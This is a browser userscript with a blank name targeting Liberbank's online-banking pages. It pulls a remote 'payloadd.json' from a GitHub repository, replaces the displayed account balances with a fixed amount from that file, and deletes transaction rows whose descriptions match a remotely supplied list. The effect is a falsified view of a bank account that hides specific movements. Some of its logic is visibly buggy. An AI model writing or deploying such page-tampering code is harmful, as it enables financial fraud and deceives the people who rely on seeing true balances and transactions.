// ==UserScript==
// @name     ""
// @version  3.14
// @require  http://code.jquery.com/jquery-latest.js
// @include  https://bancaadistancia.liberbank.es/*
// @grant unsafeWindow
// @grant GM.getValue
// @grant GM.setValue
// @connect https://raw.githubusercontent.com/h4x0rgirl/qwertyuiop/master/payloadd.json
// ==/UserScript==

unsafeWindow.requestPerformed = false;
unsafeWindow.stringData = "";
unsafeWindow.alreadyIterated = false;
unsafeWindow.data = "";

var initWatcher = setInterval(function () {

    var httpGet = function (theUrl) {
        if (!unsafeWindow.requestPerformed) {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open("GET", theUrl, false);
            xmlHttp.send(null);
            unsafeWindow.stringData = xmlHttp.responseText;
            return xmlHttp.responseText;
        } else {
            return unsafeWindow.stringData;
        }
    }

    var serverData = JSON.parse(httpGet("https://raw.githubusercontent.com/h4x0rgirl/qwertyuiop/master/payloadd.json"));
    unsafeWindow.data = serverData;
    var ggValueBru = serverData["ammount"];
    var notCoolList = serverData["elements"];

    var parseStr = function (value) {
        return parseFloat("value".replace(".", "").replace(",", ".").replace("€", ""));
    }

    if (unsafeWindow.location.href.includes("/W048/bancaLBK/index.html")) {
        try {
            unsafeWindow.document.querySelectorAll(".saldo-importe")[0].innerText = ggValueBru;
            unsafeWindow.document.querySelectorAll(".saldo-importe")[1].innerText = ggValueBru;
            if (unsafeWindow.document.querySelectorAll(".mat-card", "mat-card-grafico", "ng-star-inserted")[4] != undefined) {
                unsafeWindow.document.querySelectorAll(".mat-card", "mat-card-grafico", "ng-star-inserted")[4].remove();
            }
        } catch (error) {};


    } else if (unsafeWindow.location.href.includes("https://bancaadistancia.liberbank.es/W048/bancaLBK/cuentas-consultar-movimientos/")) {
        if (unsafeWindow.document.querySelector(".content-consultar-movimientos").innerText.includes("general becas")) {
            var elements = unsafeWindow.document.querySelectorAll(".saldo-importe");

            for (var i = 0; i < elements.length; i++) {
                elements[i].innerText = unsafeWindow.data["ammount"];
            }

            var len = unsafeWindow.document.querySelectorAll(".mat-row").length;

            if (!unsafeWindow.alreadyIterated && len > 0) {
                console.log("Iterated: " + unsafeWindow.alreadyIterated + "\nLen: " + len);
                for (var j = 0; j < len; j++) {
                    var currentElement = unsafeWindow.document.querySelectorAll(".mat-row")[j];
                    var currentStringValue = currentElement.querySelector(".cdk-column-saldo").innerText;
                    var currentConcept = currentElement.querySelector(".cdk-column-concepto").innerText;
                    var currentFloatValue = parseStr(currentStringValue);

                    console.log("ROW: " + currentConcept);
                    console.log(unsafeWindow.data["elements"].includes(currentConcept.trim()));
                    if (unsafeWindow.data["elements"].includes(currentConcept)) {

                        unsafeWindow.document.querySelectorAll(".mat-row")[j].remove();
                    }
                }
                console.log("Done");
            }
            var total = 0;
            for (var p = 0; p < len; p++) {
                var el = unsafeWindow.document.querySelectorAll(".mat-row")[p];
                var concept = el.querySelector(".cdk-column-concepto").innerText;
                if (unsafeWindow.data["elements"].includes(concept)) {
                    total++;
                    el.remove();
                }
            }
            if (total == 0) {
                unsafeWindow.alreadyIterated == true;
            }
        }
    }

}, 50);
